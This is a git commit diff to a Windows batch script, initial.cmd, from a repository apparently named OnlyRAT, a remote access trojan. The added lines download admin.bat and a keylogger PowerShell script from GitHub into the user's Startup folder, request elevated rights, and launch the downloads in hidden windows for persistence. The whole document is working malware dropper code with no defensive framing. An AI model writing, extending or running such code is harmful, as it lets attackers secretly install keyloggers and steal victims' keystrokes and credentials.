c8b316605a3d7ec670ec339edc075633d046c813
Sayuru99 <saurudealwis@ymail.com>
2024-05-25 14:54:38 +0530

    administrator usage

--- initial.cmd
+++ initial.cmd
@@ -1,21 +1,27 @@
 @echo off
 
-REM Save the current directory
 set "initialPath=%cd%"
 
 set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 cd /d "%startup%"
 
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin.bat', '%startup%\admin.bat')"
+powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"
+
+timeout /t 10 > nul
+
+powershell -Command "if (-not (Test-Path 'C:\NewDirectory')) { New-Item -Path 'C:\NewDirectory' -ItemType Directory }"
+
 (
-echo powershell -c "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList 'Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/wget2.cmd\" -OutFile \"wget2.cmd\"'"
+  echo powershell -c "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogger.ps1\" -OutFile \"wget2.ps1\""
 ) > wget.cmd
 
 powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"
 
-timeout /t 10 /nobreak > nul
+timeout /t 5 > nul
 
-powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget2.cmd\"' -WindowStyle Hidden"
+@REM powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget2.ps1\"' -WindowStyle Hidden"
 
 cd /d "%initialPath%"
 
